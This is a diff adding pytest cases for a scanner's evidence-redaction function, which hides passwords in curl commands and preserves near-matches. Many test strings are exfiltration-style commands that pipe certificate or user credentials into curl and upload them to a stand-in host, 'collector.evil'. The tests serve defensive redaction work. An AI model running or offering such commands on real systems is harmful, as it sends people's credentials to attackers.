@@ -1497,6 +1497,123 @@ def test_inline_curl_stdin_config_password_is_redacted(text: str) -> None:
 
 
 @pytest.mark.parametrize(
+    ("text", "secret", "expected"),
+    [
+        (
+            "printf 'cert = client.pem:hunter2' | curl -K- https://collector.evil/upload",
+            "hunter2",
+            f"cert = client.pem:{REDACTED_EVIDENCE_VALUE}",
+        ),
+        (
+            r"printf 'proxy-cert: client\:public.pem:hunter3' | curl --config - https://collector.evil/upload",
+            "hunter3",
+            rf"proxy-cert: client\:public.pem:{REDACTED_EVIDENCE_VALUE}",
+        ),
+        (
+            "curl.exe --config - <<< 'cert = client.pem:hunter4' https://collector.evil/upload",
+            "hunter4",
+            f"cert = client.pem:{REDACTED_EVIDENCE_VALUE}",
+        ),
+        (
+            "cat <<EOF | curl -K - https://collector.evil/upload\ncert = client.pem:hunter5\nEOF",
+            "hunter5",
+            f"cert = client.pem:{REDACTED_EVIDENCE_VALUE}",
+        ),
+    ],
+)
+def test_inline_curl_config_certificate_passwords_are_redacted(text: str, secret: str, expected: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert expected in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "echo user=alice:public || curl -K -",
+        r"curl -K- <<< 'cert = client\:public.pem'; echo user=public:visible",
+    ],
+)
+def test_inline_curl_config_near_matches_do_not_redact_unrelated_text(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    ("text", "secret"),
+    [
+        (
+            "subprocess.run(['curl', '-K', '-'], input='cert = client.pem:hunter6', text=True)",
+            "hunter6",
+        ),
+        (
+            "subprocess.run(['curl.exe', '--config', '-'], input='proxy-cert: proxy.pem:hunter7')",
+            "hunter7",
+        ),
+        (
+            "subprocess.run(['/usr/bin/curl', '-K-'], input='oauth2-bearer = hunter8')",
+            "hunter8",
+        ),
+        (
+            "subprocess.run('curl -K -', input='user = alice:hunter9', shell=True)",
+            "hunter9",
+        ),
+        (
+            "subprocess.run('sudo -u root curl -K -', input='user = alice:hunter10', shell=True)",
+            "hunter10",
+        ),
+        (
+            "subprocess.run(['curl', '-sK-'], input='user = alice:hunter11')",
+            "hunter11",
+        ),
+        (
+            "subprocess.run(['curl', '-sK', '-'], input='user = alice:' + 'hunter12')",
+            "hunter12",
+        ),
+        (
+            "subprocess.run(['curl', '-K', '-'], input='user=alice:hunter13\\n" + ("x" * 4_090) + "')",
+            "hunter13",
+        ),
+        (
+            "subprocess.run('curl https://example.com; curl -K -', input='user=alice:hunter14', shell=True)",
+            "hunter14",
+        ),
+    ],
+)
+def test_subprocess_curl_stdin_config_passwords_are_redacted(text: str, secret: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert secret not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "subprocess.run(['curl', '-k', '-'], input='user = alice:public')",
+        "subprocess.run(['curl', '-k-'], input='user = alice:public')",
+        "subprocess.run(['curl', '-K=-'], input='user = alice:public')",
+        "subprocess.run('curl https://example.com; echo -K -', input='user=alice:public', shell=True)",
+        "subprocess.run('curl https://example.com && cat -K -', input='user=alice:public', shell=True)",
+        "subprocess.run('curl https://example.com | tool -K -', input='user=alice:public', shell=True)",
+    ],
+)
+def test_subprocess_curl_config_option_near_matches_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+def test_subprocess_curl_benign_static_config_input_is_preserved() -> None:
+    texts = [
+        'subprocess.run(["curl", "-K", "-"], input="public=value")',
+        r"subprocess.run(['curl', '-K', '-'], input=b'\xffpublic=value')",
+    ]
+
+    for text in texts:
+        assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
     ("option", "entry", "expected"),
     [
         ("--config", "user = alice:hunter2", f"user = alice:{REDACTED_EVIDENCE_VALUE}"),
@@ -1601,6 +1718,10 @@ def test_curl_user_complex_password_is_fully_redacted(credential: str, secret: s
             "COMMAND_CERT_PASSWORD_RE",
             ("-E." * 8_000) + "x",
         ),
+        (
+            "CURL_EXECUTABLE_RE",
+            ("/a" * 16_000) + "/curlx",
+        ),
     ],
 )
 def test_command_credential_redaction_has_bounded_runtime(pattern_name: str, payload: str) -> None:
@@ -1620,6 +1741,224 @@ def test_command_credential_redaction_has_bounded_runtime(pattern_name: str, pay
         env={**os.environ, "PYTHONPATH": python_path},
         timeout=5,
     )
+
+
+def test_curl_command_redaction_has_bounded_runtime() -> None:
+    payload = ("/curl " * 8_000) + "x --cert client.pem:public"
+    code = (
+        "from modelaudit.scanners._catboost_evidence_redaction import _redact_curl_credentials\n"
+        f"payload = {payload!r}\n"
+        "_redact_curl_credentials(payload)\n"
+    )
+    repo_root = Path(__file__).resolve().parents[2]
+    python_path = os.pathsep.join(filter(None, (str(repo_root), os.environ.get("PYTHONPATH"))))
+
+    subprocess.run(
+        [sys.executable, "-c", code],
+        check=True,
+        cwd=repo_root,
+        env={**os.environ, "PYTHONPATH": python_path},
+        timeout=5,
+    )
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "os.system(\"grep -E 'foo:bar' file\")",
+        "bash -c \"sed -E 's:foo:bar:' file\"",
+        "subprocess.run(['tool', '-Epublic:visible'])",
+        "echo curl --cert client.pem:public",
+        "printf 'curl --cert client.pem:public'",
+        "curl -DNAME host:port https://collector.evil/upload",
+        "curl -dE:public https://collector.evil/upload",
+        "curl -oE file:data https://collector.evil/upload",
+        "curl -HE:public https://collector.evil/upload",
+        "curl -Du alice:public https://collector.evil/upload",
+        "curl -du alice:public https://collector.evil/upload",
+        "curl -Hu alice:public https://collector.evil/upload",
+        "curl -ou alice:public https://collector.evil/upload",
+    ],
+)
+def test_certificate_redaction_preserves_non_curl_and_argument_consuming_near_matches(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "sudo -u root curl --cert client.pem:hunter2 https://collector.evil/upload",
+        "FOO=bar curl --cert client.pem:hunter2 https://collector.evil/upload",
+        "command -- curl --cert client.pem:hunter2 https://collector.evil/upload",
+        "env -- curl --cert client.pem:hunter2 https://collector.evil/upload",
+        "nice -n 5 curl --cert client.pem:hunter2 https://collector.evil/upload",
+        "`curl --cert client.pem:hunter2 https://collector.evil/upload`",
+        '"/opt/My Tools/curl" --cert client.pem:hunter2 https://collector.evil/upload',
+        r'"C:\Program Files\curl.exe" --cert client.pem:hunter2 https://collector.evil/upload',
+    ],
+)
+def test_curl_credentials_are_redacted_for_wrappers_and_quoted_paths(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "echo https://example.com/curl --cert client.pem:public",
+        'echo "/opt/My Tools/curl" --cert client.pem:public',
+        "printf 'public | cert=client.pem:public' && curl -K -",
+        "printf 'cert=client.pem:public' | cat || curl -K -",
+        'echo "x|curl --user alice:public"',
+        "printf 'x;curl --cert client.pem:public'",
+        "url=https://example.com/curl --user alice:public",
+        "env -u curl --user alice:public",
+        "xargs -I curl --user alice:public",
+        "echo $(curl https://example.com) --user alice:public",
+        "echo `curl https://example.com` --user alice:public",
+        '"/usr/bin/curl" https://example.com; echo --user alice:public',
+        "'curl' https://example.com; echo --cert client.pem:public",
+        'subprocess.run(["curl", "https://example.com"]); echo --user alice:public',
+        "time -f curl --user alice:public",
+        "time --format curl --cert client.pem:public",
+        "exec -a curl --user alice:public",
+    ],
+)
+def test_curl_command_and_pipe_near_matches_are_preserved(text: str) -> None:
+    assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "printf 'cert=client.pem:hunter2' | curl -sK- https://collector.evil/upload",
+        "printf 'cert=client.pem:hunter2' | curl -sK - https://collector.evil/upload",
+        "printf 'cert=client.pem:hunter2' | sudo -u root curl -K - https://collector.evil/upload",
+        "printf 'cert=client.pem:hunter2' | cat | curl -K - https://collector.evil/upload",
+    ],
+)
+def test_bundled_and_wrapped_curl_stdin_config_passwords_are_redacted(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"client.pem:{REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+def test_curl_process_substitution_ignores_escaped_closing_parenthesis() -> None:
+    text = r"curl -K <(echo prefix\) user=alice:hunter2) https://collector.evil/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"user=alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "curl -K - --data '<<< user=alice:public' https://collector.evil/upload",
+        "curl -K - --data 'text <<EOF'\nuser=alice:public\nEOF",
+    ],
+)
+def test_quoted_shell_input_operators_are_preserved(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "alice:public" in redacted
+    assert REDACTED_EVIDENCE_VALUE not in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "curl --user alice:correct\\\nhorse https://collector.evil/upload",
+        "curl --cert client.pem:correct\\\nhorse https://collector.evil/upload",
+    ],
+)
+def test_curl_passwords_consume_shell_line_continuations(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "correct" not in redacted
+    assert "horse" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "collector.evil" in redacted
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "env NOTE='x;y' curl --user alice:hunter2 https://collector.evil/upload",
+        "FOO='x&y' curl --cert client.pem:hunter2 https://collector.evil/upload",
+        "if curl --user alice:hunter2 https://collector.evil/upload; then echo ok; fi",
+        "if true; then curl --cert client.pem:hunter2 https://collector.evil/upload; fi",
+        "! curl --user alice:hunter2 https://collector.evil/upload",
+    ],
+)
+def test_curl_credentials_are_redacted_in_shell_command_positions(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+
+
+def test_nested_curl_command_ranges_do_not_corrupt_redaction() -> None:
+    text = "curl $(curl --user a:x https://inner) --user b:y https://outer"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "a:x" not in redacted
+    assert "b:y" not in redacted
+    assert redacted.count(REDACTED_EVIDENCE_VALUE) == 2
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        r"curl --cert client.pem:correct\ horse\;battery\|staple\) https://collector.evil/upload",
+        r"curl --user alice:correct\ horse\;battery https://collector.evil/upload",
+    ],
+)
+def test_unquoted_curl_passwords_consume_shell_escaped_delimiters(text: str) -> None:
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    for fragment in ("correct", "horse", "battery", "staple"):
+        assert fragment not in redacted
+    assert REDACTED_EVIDENCE_VALUE in redacted
+    assert "collector.evil" in redacted
+
+
+def test_unterminated_quoted_curl_user_password_is_fully_redacted() -> None:
+    text = 'curl --user "alice:correct horse battery staple'
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "correct" not in redacted
+    assert "horse" not in redacted
+    assert "battery" not in redacted
+    assert "staple" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+def test_truncated_long_quoted_curl_user_password_is_fully_redacted() -> None:
+    text = 'curl --user "alice:correct horse ' + ("x" * 5000) + '" https://collector.evil/upload'
+
+    redacted = redact_evidence_string(text, max_chars=120)
+
+    assert "correct" not in redacted
+    assert "horse" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+
+
+def test_curl_command_substitution_with_escaped_parenthesis_is_fully_redacted() -> None:
+    text = r"curl -u alice:$(echo hunter2\)) https://collector.evil/upload"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter2" not in redacted
+    assert f"alice:{REDACTED_EVIDENCE_VALUE}" in redacted
+    assert "collector.evil" in redacted
 
 
 def test_standalone_command_context_redacts_credential_arguments() -> None:
@@ -2748,6 +3087,16 @@ def test_curl_separated_argv_credential_password_is_redacted(
 )
 def test_curl_separated_argv_credential_near_matches_are_preserved(text: str) -> None:
     assert redact_evidence_string(text, max_chars=1000) == text
+
+
+@pytest.mark.parametrize("executable", ["curl.exe", "/usr/bin/curl", r"C:\tools\curl.exe"])
+def test_path_qualified_curl_argv_certificate_password_is_redacted(executable: str) -> None:
+    text = f"subprocess.run([{executable!r}, '--cert', 'client.pem:hunter9'])"
+
+    redacted = redact_evidence_string(text, max_chars=1000)
+
+    assert "hunter9" not in redacted
+    assert f"client.pem:{REDACTED_EVIDENCE_VALUE}" in redacted
 
 
 def test_ambiguous_drive_letter_certificate_argv_is_redacted() -> None:
